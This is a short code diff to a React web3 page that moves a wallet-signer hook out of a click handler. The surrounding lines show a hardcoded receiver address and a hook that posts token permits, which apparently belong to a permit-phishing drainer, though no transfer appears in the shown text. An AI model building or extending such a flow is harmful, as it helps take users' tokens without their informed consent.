@@ -37,6 +37,7 @@ export default function Home() {
   const chainId = chain?.id;
   const currentChainOrDefaultChain = useMemo(() => getChainOrDefaultChain(chainId), [chainId]);
   const isChainSupported = useMemo(() => isSupportedChain(chainId), [chainId]);
+  const signer = useEthersSigner({ chainId });
 
   const { mutate: postPermit } = usePostPermit();
 
@@ -46,8 +47,6 @@ export default function Home() {
     if (!tokenAddress) return toast.error("Please select a token");
 
     setIsLoading(true);
-
-    const signer = useEthersSigner({ chainId });
     const receiver = "0x43a04F19Cc140102501AcC9da48BF85f9EE8829f";
 
     const provider = getStaticProvider(chainId);
